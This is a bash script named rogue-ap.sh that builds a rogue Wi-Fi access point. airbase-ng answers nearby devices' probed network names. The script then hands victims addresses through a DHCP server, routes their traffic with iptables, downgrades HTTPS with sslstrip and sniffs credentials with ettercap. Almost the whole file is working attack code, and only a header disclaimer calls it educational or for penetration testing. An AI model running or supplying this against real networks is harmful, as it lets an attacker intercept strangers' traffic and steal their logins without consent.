#!/bin/bash

###############################################################################
## rogue-ap.sh: This script will create a rogue accesspoint who listen to    ##
## advertised essids.                                                        ##
##                                                                           ##
## WARNING: This script is for educational purposes and penetration testing  ##
## purposes only. The creator of this script is in no way responsible for    ##
## the actions of the user.                                                  ##
###############################################################################
## Author : Harald van der Laan                                              ##
## Date   : 2014 / 11 / 26                                                   ##
## Version: v0.1.5                                                     (HLA) ##
###############################################################################
## Requirements:                                                             ##
## + Hardware                                                                ##
##   - Physical wifi interface that can turned to monitor mode.              ##
##   - Seconde network interface for internet connection.                    ##
## + Software                                                                ##
##   - airmon-ng                                                             ##
##   - airbase-ng                                                            ##
##   - sslstrip                                                              ##
##   - isc-dhcp-server                                                       ##
##   - ettercap                                                              ##
## + Linux requirements                                                      ##
##   - root privileges                                                       ##
###############################################################################
## Change log:                                                               ##
## - v0.1    (Inital version)                                          (HLA) ##
## - v0.1.1  (Extra cleanup and disable ipv4 forward in clean up)      (HLA) ##
## - v0.1.2  (Added longer sleeps because of at0 errors)               (HLA) ##
## - v0.1.3  (Added extra output)                                      (HLA) ##
## - v0.1.4  (Changed MTU to 1500)                                     (HLA) ##
## - v0.1.5  (Changed location of dhcpd config file)                   (HLA) ##
###############################################################################

## Global setting
###############################################################################
version="v0.1.5"

cred="\033[1;31m"	# Color red.
cgreen="\033[1;32m"	# Color green.
creset="\033[0m"	# Color reset.

monIface="mon0"		# Default monitor interface.

## Functions
###############################################################################
function fCheck() {
	if [ -z $(which ${1}) ]; then
		# Requirment not met.
		echo -e "[ ${cred}Error${creset} ]: could not find ${1}."
		echo -e "[ ${cred}Error${creset} ]: sudo apt-get install ${1}."
		echo
		exit 1
	fi
}

## Banner
###############################################################################
clear
echo
echo "rogue-ap.sh version: ${version}"
echo 

## Checks
###############################################################################
if [ ${UID} -ne 0 ]; then
	# User is not root. This script need root privileges.
	echo -e "[ ${cred}Error${creset} ]: This script must be runned with root privileges."
	echo
	exit 1
fi

if [ ! -f config/dhcpd.conf ]; then
	# File dhcpd.conf is not found
	echo -e "[ ${cred}Error${creset} ]: Could not find dhcpd.conf."
	echo -e "[ ${cred}Error${creset} ]: Please place a default dhcpd.conf in the working directory."
	echo -e "[ ${cred}Error${creset} ]: The working directory is: $(pwd)"
	echo
	exit 1
fi

fCheck airmon-ng
fCheck airbase-ng
fCheck dhcpd
fCheck sslstrip
fCheck ettercap

## Main script
###############################################################################
echo "This could be you gateway: $(route -n -A inet | awk '/UG/ {print $2}')"
read -p "Please enter the internet gateway. For example: 192.168.1.1: " gatewayIp
read -p "Please enter the interface with internet connection. For example eth0: " inetIface
read -p "Please enter the rogue accesspoint interface. For example wlan0: " rogueIface

## Starting Physical interface in monitor mode.
echo "[ ]: Staring rogue accesspoint."
airmon-ng start ${rogueIface} &> /dev/null
sleep 5
xterm -geometry 75x15+1+0 -T 'Rogue Accesspoint' -e "airbase-ng -P -C 30 ${monIface}" & airbasePid=${!}
sleep 5
echo -e "[ ${cgreen}Done${creset} ]: Rogue accesspoint started."

## Creating at0 device and forward firewall rules.
echo "[ ]: Setting at0 and firewall rules."
ifconfig at0 192.168.1.1 netmask 255.255.255.0
ifconfig at0 mtu 1500
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to ${gatewayIp}
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface ${inetIface} -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo -e "[ ${cgreen}Done${creset} ]: Setting up firewall rules and at0 device."

## Starting isc-dhcp-server
echo "[ ]: Staring isc-dhcp-server."
dhcpd -cf config/dhcpd.conf -pf /var/run/dhcpd.pid at0 &> /dev/null
sleep 3
/etc/init.d/isc-dhcp-server start &> /dev/null
echo -e "[ ${cgreen}Done${creset} ]: Isc-dhcp-server started."

## Starting sslstrip
xterm -geometry 75x15+1+0 -T 'sslstrip' -e 'sslstrip -f -p -k 10000' & sslstripPid=${!}

## Starting ettercap
xterm -geometry 75x15+1+0 -T 'Ettercap' -e 'ettercap -p -u -T -q -i at0' & ettercapPid=${!}

## Stop script and clean up
echo "[ ]: When enter is pressed this script will stop and clean up."
read

kill ${ettercapPid} ${sslstripPid} ${airbasePid}
iptables -F
iptables -t nat -F
iptables -X
iptables -t nat -X

echo 0 > /proc/sys/net/ipv4/ip_forward

airmon-ng stop mon0 &> /dev/null

echo -e "[ ${cgreen}Done${creset} ]: cleaning up."
exit 0
